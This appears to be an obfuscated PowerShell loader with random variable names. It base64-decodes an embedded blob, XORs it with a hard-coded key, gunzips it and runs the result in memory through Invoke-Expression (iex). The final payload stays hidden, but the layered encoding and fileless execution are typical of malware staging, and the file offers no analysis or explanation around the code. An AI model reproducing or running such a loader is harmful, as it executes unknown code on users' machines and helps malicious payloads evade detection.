$xnvsm7ptqdcjr38 = [System.Text.Encoding]::ascii
function z97dvi65g2t4f0xw3oasnbreqyp  {param($6jr5n3z1dv94e0l )
  $o2i8smvfa5zh0y7 = [System.Convert]::FromBase64String($6jr5n3z1dv94e0l)
  $efn49qtku073gbc= $xnvsm7ptqdcjr38.GetBytes("64sip29xrze8")
    $0l79nbtws1qkp4j = $o2i8smvfa5zh0y7
    $8hcfktzgj9sp05l = $(for ($4w3ecq6ofhl98gm = 0; $4w3ecq6ofhl98gm -lt $0l79nbtws1qkp4j.length; ) {
        for ($5m9t3z74j6lugf0 = 0; $5m9t3z74j6lugf0 -lt $efn49qtku073gbc.length; $5m9t3z74j6lugf0++) {
            $0l79nbtws1qkp4j[$4w3ecq6ofhl98gm] -bxor $efn49qtku073gbc[$5m9t3z74j6lugf0]
            $4w3ecq6ofhl98gm++
            if ($4w3ecq6ofhl98gm -ge $0l79nbtws1qkp4j.Length) {
                $5m9t3z74j6lugf0 = $efn49qtku073gbc.length
            }
        }
    })
	$d0orhjcu7n3ws9y = New-Object System.IO.MemoryStream( , $8hcfktzgj9sp05l )

	    $6kvx428izmlqy01 = New-Object System.IO.MemoryStream
        $fen0uosxgbd8v9w = New-Object System.IO.Compression.GzipStream $d0orhjcu7n3ws9y, ([IO.Compression.CompressionMode]::Decompress)
	    $fen0uosxgbd8v9w.CopyTo( $6kvx428izmlqy01 )
        $fen0uosxgbd8v9w.Close()
		$d0orhjcu7n3ws9y.Close()
		[byte[]] $72nawd86tfbr451 = $6kvx428izmlqy01.ToArray()
 $8kg34w5oeq9zcn2=$72nawd86tfbr451
    return $8kg34w5oeq9zcn2
}
[byte[]]$xj2qusw67n15gby=z97dvi65g2t4f0xw3oasnbreqyp $beor86dn4hkqp1i
[System.Text.Encoding]::ascii.GetString((z97dvi65g2t4f0xw3oasnbreqyp "Kb97aXAyOXh2euht7UaRUWBPZ9KOdU8tbbUWhUKleVbnfQWksu3joPXooCVUT0BU7yLCDDegCFy5xSrDdHYTdxJl4C7ZD5/M36LfPESK5Pyp8CAkf7PKWuYKMDpdIGD5IycyqyoHU8lRY0tkRMyf8tvsHix/05cbkWoLPFXDK6dRkml12WMhuKCq6d1AVgt/ONetqrk7qE4RvGBttaHR2/Yx38DsRYYs4Qd5cHpBaNW2P19FdKy6ShfXFgjPXva/7JWB+ODFc/jXzJQjcEgy7HK9Smn3eUdRgWfJhdLl8nylYettBdxumul4XIubS4v0CaqCdwQ78TyQg8E7duHpcnmimevE05jsu2hMUU7Ae+BDNbSmYzund2sRmaQhhEySlRm6Y6TxySDH5R6lTwM7VaceaA/fQw9h+2PHNN902mWMlRGh2MYOKYpeMDxEmrZl5rNuqe3HtL6Jg9lhwACCgc4UbgFkAenLFs/RhVTNR7WIFz1GmMedFEVdbIvRJ9xhZMKwnyNirHCMcM9t4O6IlErQa+lSqk8X8/CFNLBarNJSphT3XHzsLvyRY7UuzCj7ttMCdEViNOG5NFYjKcJEih4M17mKBWF8ww8z4TDvWOwC//8VMsJMuLvmz/EK0ptk4WXdK6W/sIqjY8tqiAxSGJwifAZmi9RuPytub4X9pIa6h4i4Z5pLYJnreJI1KHgMODjJzXdofKhCIDWlt7Zb7utq2uNtBXyJWtI4atYSd/bH87X48Af4GEavMyDaHe2QjKjE92KrTwPOA431YFFIceOa7WfapSa2RhxbSfPGolR15mD4fsv0bXnv+jiI3PsQ7e/qv8nQjyvUfbr8R8C6Q9Z6HiqgCnOUJhpIC4Qnt9hCbDFyHpYCp3IYymEO0DCeDYeM2Kg3PhBuEcw8h+FXk7w2jC1WLNC60BMnQ/HZOfjE304kRFdVGhkeTRfFSMgJzoimaGcvekUamtKnN8pBdYFD6ky1zbPfvXWUlcwNC9cggYfqzcOImaaAVp79mdtfaG0E3pbadwbNjreHm40GBH3+SEfHQbK75zENUr+Hc2TXLi2nMDWRXaV1eZM0PlSk/J8+bED8Qbh5k7L4OlUYcEMzfRUIc+BFGzq9xz0VVR3gJz9d8iOiSqWNvBQuhD0KRyc2LH5Y+UDyeMRXuoMoVvGxNMLla+K6JDF2hXsdMHmE8CQHyxon2JHA9LH4ZxxirkpyDYOW0yd1emU="))|iex;